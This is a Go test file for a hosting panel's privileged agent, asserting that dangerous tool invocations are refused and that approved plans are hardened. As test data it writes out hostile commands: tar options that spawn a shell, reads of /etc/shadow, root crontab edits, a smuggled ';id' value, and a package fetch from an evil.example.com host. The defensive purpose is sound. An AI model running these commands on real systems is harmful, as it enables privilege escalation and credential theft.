		{"tar rsh", tc(modeStreamOut, "tar", "--create", "--file", "host:/x", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--rsh-command=/bin/sh", ".")},
		{"tar to a file", tc(modeStreamOut, "tar", "--create", "--file", "/etc/cron.d/x", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", ".")},
		{"tar of root", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", "/", "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", ".")},
		{"tar of etc", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", "/etc", "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", ".")},
		{"tar of the web root", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", www, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", ".")},
		{"tar through symlink", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", filepath.Join(www, "bob"), "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", ".")},
		{"tar extra member", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "/etc/shadow", ".")},
		{"tar files-from", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--files-from=/etc/x", ".")},
		{"tar remove-files", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--remove-files", ".")},
		// tar -x
		{"untar into etc", tc(modeStreamIn, "tar", "-xzf", "-", "-C", "/etc", "--no-same-owner")},
		{"untar into root", tc(modeStreamIn, "tar", "--extract", "--file", "-", "--directory", "/", "--no-same-owner")},
		{"untar into the web root", tc(modeStreamIn, "tar", "--extract", "--file", "-", "--directory", www, "--no-same-owner")},
		{"untar through symlink", tc(modeStreamIn, "tar", "--extract", "--file", "-", "--directory", filepath.Join(www, "bob", "cron.d"), "--no-same-owner")},
		{"untar to-command", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--to-command=sh")},
		{"untar absolute names", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "-P")},
		{"untar absolute long", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--absolute-names")},
		{"untar checkpoint", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--checkpoint-action=exec=sh")},
		{"untar compress program", tc(modeStreamIn, "tar", "-x", "-I", "sh", "-f", "-", "-C", site)},
		{"untar info script", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--info-script=/tmp/x")},
		{"untar volume script", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--new-volume-script=/tmp/x")},
		{"untar force local", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--force-local")},
		{"untar rmt", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--rmt-command=/tmp/x")},
		{"untar member up", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "../x")},
		{"untar member absolute", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "/etc")},
		{"untar file through stream", tc(modeStreamIn, "tar", "-xzf", "/etc/shadow", "-C", site)},
		{"untar stdin through tool", tc(modeTool, "tar", "-xzf", "-", "-C", site)},
		{"untar shadow", tc(modeTool, "tar", "-xzf", "/etc/shadow", "-C", site)},
		{"untar download up", tc(modeTool, "tar", "-xzf", s.cfg.DownloadsDir()+"/../x.tar.gz", "-C", site)},
		{"untar two archives", tc(modeStreamIn, "tar", "-xzf", "-", "--file", "/etc/shadow", "-C", site)},
		{"untar two destinations", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "-C", "/etc")},
		{"untar no destination", tc(modeStreamIn, "tar", "-xzf", "-")},
		// crontab
		{"crontab root", tc(modeTool, "crontab", "-u", "root", "-")},
		{"crontab admin", tc(modeTool, "crontab", "-u", "admin", "-")},
		{"crontab www-data", tc(modeTool, "crontab", "-u", "www-data", "-")},
		{"crontab docker member", tc(modeTool, "crontab", "-u", "sneaky", "-")},
		{"crontab system uid", tc(modeTool, "crontab", "-u", "daemonish", "-")},
		{"crontab service user", tc(modeTool, "crontab", "-u", "monopanel", "-")},
		{"crontab unknown", tc(modeTool, "crontab", "-u", "nobody-here", "-")},
		{"crontab file", tc(modeTool, "crontab", "-u", "alex", "/etc/x")},
		{"crontab list", tc(modeTool, "crontab", "-l", "-u", "alex")},
		{"crontab own", tc(modeTool, "crontab", "-")},
		// du
		{"du root", tc(modeTool, "du", "-sb", "/root")},
		{"du everything", tc(modeTool, "du", "-sb", "/")},
		{"du web root", tc(modeTool, "du", "-sb", www)},
		{"du files0", tc(modeTool, "du", "--files0-from=/etc/shadow")},
		{"du human", tc(modeTool, "du", "-sh", home)},
		// php modules
		{"phpenmod path", tc(modeTool, "phpenmod", "-v", "8.3", "../../tmp/x")},
		{"phpenmod sapi", tc(modeTool, "phpenmod", "-s", "fpm", "imagick")},
		{"phpenmod all", tc(modeTool, "phpenmod", "-v", "ALL", "imagick")},
		// sshd
		{"sshd config", tc(modeTool, "sshd", "-t", "-f", "/tmp/sshd_config")},
		{"sshd daemon", tc(modeTool, "sshd", "-D", "-o", "PermitRootLogin=yes", "-p", "2222")},
		{"sshd -T -C", tc(modeTool, "sshd", "-T", "-C", "user=root")},
		// journalctl
		{"journal flush", tc(modeTool, "journalctl", "--flush")},
		{"journal vacuum", tc(modeTool, "journalctl", "--vacuum-time=1s")},
		{"journal file", tc(modeTool, "journalctl", "--file=/etc/shadow")},
		{"journal dir", tc(modeTool, "journalctl", "-D", "/tmp", "-u", "x.service", "-n", "1", "--no-pager", "-o", "short-iso")},
		{"journal export", tc(modeTool, "journalctl", "-u", "nginx.service", "-n", "200", "--no-pager", "-o", "export")},
		{"journal glob", tc(modeTool, "journalctl", "-u", "*", "-n", "200", "--no-pager", "-o", "short-iso")},
		{"journal option unit", tc(modeTool, "journalctl", "-u", "--flush.service", "-n", "200", "--no-pager", "-o", "short-iso")},
		{"journal lines", tc(modeTool, "journalctl", "-u", "nginx.service", "-n", "0", "--no-pager", "-o", "short-iso")},
		{"journal env", withEnv(tc(modeTool, "journalctl", "-u", "nginx.service", "-n", "1", "--no-pager", "-o", "short-iso"), "TZ=UTC")},
		// percona-release
		{"percona enable", tc(modeTool, "percona-release", "enable-only", "tools")},
		{"percona other", tc(modeTool, "percona-release", "setup", "ps-80")},
		// fail2ban-client
		{"fail2ban action", tc(modeTool, "fail2ban-client", "set", "sshd", "action", "x", "actionban", "sh -c id")},
		{"fail2ban addaction", tc(modeTool, "fail2ban-client", "set", "sshd", "addaction", "x")},
		{"fail2ban config", tc(modeTool, "fail2ban-client", "-c", "/tmp/f2b", "reload")},
		{"fail2ban unban all", tc(modeTool, "fail2ban-client", "unban", "--all")},
		{"fail2ban reload", tc(modeTool, "fail2ban-client", "reload")},
		{"fail2ban bad jail", tc(modeTool, "fail2ban-client", "status", "-x")},
		// nft
		{"nft other file", tc(modeTool, "nft", "-f", "/tmp/rules.nft")},
		{"nft flush", tc(modeTool, "nft", "flush", "ruleset")},
		{"nft shadow", tc(modeTool, "nft", "-c", "-f", "/etc/shadow")},
		// firewall-cmd
		{"firewalld direct", tc(modeTool, "firewall-cmd", "--direct", "--passthrough", "ipv4", "-F")},
		{"firewalld rich rule", tc(modeTool, "firewall-cmd", "-q", "--permanent", "--add-rich-rule=rule family=ipv4 accept")},
		{"firewalld port 0", tc(modeTool, "firewall-cmd", "-q", "--permanent", "--add-port=0/tcp")},
		{"firewalld port big", tc(modeTool, "firewall-cmd", "-q", "--permanent", "--add-port=99999/tcp")},
		{"firewalld no ports", tc(modeTool, "firewall-cmd", "-q", "--permanent")},
		// postfix tools
		{"postmap shadow", tc(modeTool, "postmap", "hash:/etc/shadow")},
		{"postmap up", tc(modeTool, "postmap", "hash:/etc/postfix/../shadow")},
		{"postmap query", tc(modeTool, "postmap", "-q", "root", "hash:/etc/postfix/monopanel/virtual_domains")},
		{"postmap regexp", tc(modeTool, "postmap", "regexp:/etc/postfix/monopanel/x")},
		{"postconf edit", tc(modeTool, "postconf", "-e", "daemon_directory=/tmp")},
		{"postconf config", tc(modeTool, "postconf", "-c", "/tmp")},
		{"newaliases options", tc(modeTool, "newaliases", "-oA/tmp/aliases")},
		// a tool through a channel the panel does not use for it
		{"du stream", tc(modeStreamOut, "du", "-sb", home)},
		{"crontab stream", tc(modeStreamIn, "crontab", "-u", "alex", "-")},
		{"nul byte", tc(modeTool, "du", "-sb", home+"\x00/etc")},
	})
}

func TestToolPolicyRefusesSELinuxAndDnfShapesEL(t *testing.T) {
	s := policyServer(t, alma9)
	mustRefuse(t, s, []policyCase{
		{"fcontext shadow", tc(modeTool, "semanage", "fcontext", "-a", "-t", "shadow_t", "/var/www/[^/]+/data/www(/.*)?")},
		{"fcontext etc", tc(modeTool, "semanage", "fcontext", "-a", "-t", "httpd_sys_content_t", "/etc(/.*)?")},
		{"fcontext delete", tc(modeTool, "semanage", "fcontext", "-d", "/var/www(/.*)?")},
		{"semanage login", tc(modeTool, "semanage", "login", "-a", "-s", "sysadm_u", "alex")},
		{"semanage permissive", tc(modeTool, "semanage", "permissive", "-a", "httpd_t")},
		{"semanage ssh port", tc(modeTool, "semanage", "port", "-a", "-t", "ssh_port_t", "-p", "tcp", "2222")},
		{"semanage udp", tc(modeTool, "semanage", "port", "-a", "-t", "http_port_t", "-p", "udp", "443")},
		{"semanage port range", tc(modeTool, "semanage", "port", "-a", "-t", "http_port_t", "-p", "tcp", "1-65535")},
		{"setsebool other", tc(modeTool, "setsebool", "-P", "allow_execmem=1")},
		{"setsebool mixed", tc(modeTool, "setsebool", "-P", "httpd_unified=1", "selinuxuser_execmod=1")},
		{"setsebool runtime", tc(modeTool, "setsebool", "httpd_unified=1")},
		{"setsebool value", tc(modeTool, "setsebool", "-P", "httpd_unified=on;id")},
		{"semodule other", tc(modeTool, "semodule", "-i", "/tmp/evil.cil")},
		{"semodule disable", tc(modeTool, "semodule", "-d", "monopanel")},
		{"semodule priority", tc(modeTool, "semodule", "-X", "400", "-i", "/etc/monopanel/selinux/monopanel.cil")},
		{"restorecon all", tc(modeTool, "restorecon", "-R", "/")},
		{"restorecon etc", tc(modeTool, "restorecon", "-RF", "/etc")},
		{"restorecon list", tc(modeTool, "restorecon", "-f", "/tmp/list")},
		{"restorecon output", tc(modeTool, "restorecon", "-o", "/etc/cron.d/x", "-R", s.cfg.WWWRoot)},
		{"restorecon none", tc(modeTool, "restorecon", "-R")},
		{"restorecon unclean", tc(modeTool, "restorecon", "-R", s.cfg.WWWRoot+"/../../etc")},
		{"ausearch input", tc(modeTool, "ausearch", "-if", "/etc/shadow")},
		{"ausearch extra", tc(modeTool, "ausearch", "-m", "AVC", "-ts", "today", "--raw", "-if", "/etc/shadow")},
		{"setenforce word", tc(modeTool, "setenforce", "Permissive")},
		{"dnf local", tc(modeTool, "dnf", "-y", "install", "--enablerepo=crb", "/tmp/x.rpm")},
		{"dnf url", tc(modeTool, "dnf", "-y", "install", "--enablerepo=crb", "https://evil.example.com/x.rpm")},
		{"dnf rpm name", tc(modeTool, "dnf", "-y", "install", "--enablerepo=crb", "x.rpm")},
		{"dnf other repo", tc(modeTool, "dnf", "-y", "install", "--enablerepo=evil", "postfix")},
		{"dnf all repos", tc(modeTool, "dnf", "-y", "install", "--enablerepo=*", "postfix")},
		{"dnf nogpgcheck", tc(modeTool, "dnf", "-y", "install", "--nogpgcheck", "postfix")},
		{"dnf setopt", tc(modeTool, "dnf", "-y", "--setopt=gpgcheck=0", "install", "postfix")},
		{"dnf option as package", tc(modeTool, "dnf", "-y", "install", "--enablerepo=crb", "--nogpgcheck")},
		{"dnf shell", tc(modeTool, "dnf", "shell")},
	})
	// dnf is an EL tool
	mustRefuse(t, policyServer(t, debian13), []policyCase{{"dnf on debian", tc(modeTool, "dnf", "-q", "repolist", "--all")}})
}

// The plans run what was checked: mysql always gets --binary-mode and
// --local-infile=0, the cache of restic is the agent's, tar --create gets
// the directory as a descriptor, tar -x is the agent's own.
func TestToolPlansCarryWhatWasChecked(t *testing.T) {
	s := policyServer(t, debian13)
	home := filepath.Join(s.cfg.WWWRoot, "alex")
	mkdirs(t, home)
	plan, err := s.planTool(&toolCall{name: "mysql", args: []string{"--protocol=socket", "--batch"}, mode: modeTool})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(plan.args[:2], " ") != "--binary-mode --local-infile=0" {
		t.Fatalf("mysql argv %q", plan.args)
	}
	plan, err = s.planTool(&toolCall{name: "restic", args: []string{"init"}, env: []string{"RESTIC_REPOSITORY=/var/backups/x", "RESTIC_PASSWORD=p", "RESTIC_CACHE_DIR=" + s.cfg.DataDir + "/cache"}, mode: modeTool})
	if err != nil {
		t.Fatal(err)
	}
	env := strings.Join(plan.env, "\n")
	if strings.Contains(env, s.cfg.DataDir) || !strings.Contains(env, "RESTIC_CACHE_DIR="+resticCacheDir) {
		t.Fatalf("restic env %q", plan.env)
	}
	plan, err = s.planTool(&toolCall{name: "tar", mode: modeStreamOut, args: []string{"--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "."}})
	if err != nil {
		t.Fatal(err)
	}
	if plan.args[4] != "/proc/self/fd/3" || len(plan.files) != 1 {
		t.Fatalf("tar argv %q files %d", plan.args, len(plan.files))
	}
	var st, want os.FileInfo
	if st, err = plan.files[0].Stat(); err == nil {
		want, err = os.Stat(home)
	}
	if err != nil || !os.SameFile(st, want) {
		t.Fatalf("tar gets %v, want the home (%v)", st, err)
	}
	plan.close()
	plan, err = s.planTool(&toolCall{name: "tar", mode: modeStreamIn, args: []string{"--extract", "--file", "-", "--directory", home, "--no-same-owner"}})
	if err != nil || plan.native == nil {
		t.Fatalf("tar -x must be the agent's own: %v", err)
	}
	plan.close()
	plan, err = s.planTool(&toolCall{name: "restic", args: []string{"restore", "1a2b3c4d", "--target", "/", "--include", home}, env: []string{"RESTIC_REPOSITORY=/var/backups/x", "RESTIC_PASSWORD=p"}, mode: modeTool})
	if err != nil || plan.wrap == nil {
		t.Fatalf("an in-place restore must be staged: %v", err)
	}
}

// Sphinx 3 unpacks into its own directory on EL and nowhere else of /opt.
func TestTarIntoSphinxDirectory(t *testing.T) {
	s := policyServer(t, alma9)
	_, err := s.planTool(&toolCall{name: "tar", mode: modeStreamIn, args: []string{"-xzf", "-", "-C", "/opt/monopanel/sphinx", "--strip-components=1", "--no-same-owner"}})
	// the shape passes; the directory does not exist on the test machine
	if err == nil || !strings.Contains(err.Error(), "no such file") {
		t.Fatalf("sphinx: %v", err)
	}
	_, err = s.planTool(&toolCall{name: "tar", mode: modeStreamIn, args: []string{"-xzf", "-", "-C", "/opt/monopanel", "--no-same-owner"}})
	var ae *Error
	if !errors.As(err, &ae) || ae.Status != http.StatusForbidden || !strings.Contains(ae.Message, "not allowed") {
		t.Fatalf("/opt/monopanel: %v", err)
	}
}

// A symlink only root can have made is followed (/var/run -> ../run,
// /var/mail -> spool/mail on EL and Arch); one in a directory someone else
// owns is not.
func TestOpenDirNoFollowTrustsOnlyRootsSymlinks(t *testing.T) {
	for link, target := range map[string]string{"/var/run": "/run", "/var/mail": "/var/spool/mail"} {
		st, err := os.Lstat(link)
		if err != nil || st.Mode()&os.ModeSymlink == 0 {
			continue // a real directory here, nothing to follow
		}
		fd, err := openDirNoFollow(link)
		if err != nil {
			t.Errorf("%s: %v", link, err)
			continue
		}
		f := fdFile(fd, link)
		got, _ := f.Stat()
		want, _ := os.Stat(target)
		f.Close()
		if !os.SameFile(got, want) {
			t.Errorf("%s opened something else than %s", link, target)
		}
	}
	dir := t.TempDir()
	mkdirs(t, filepath.Join(dir, "real", "sub"))
	if err := os.Symlink("real", filepath.Join(dir, "mine")); err != nil {
		t.Fatal(err)
	}
	if fd, err := openDirNoFollow(filepath.Join(dir, "mine", "sub")); err == nil {
		unix.Close(fd)
		t.Fatal("a symlink of a user's must not be followed")
	} else if !errors.Is(err, errSymlinkComponent) {
		t.Fatalf("want errSymlinkComponent, got %v", err)
	}
	fd, err := openDirNoFollow(filepath.Join(dir, "real", "sub"))
	if err != nil {
		t.Fatal(err)
	}
	unix.Close(fd)
}
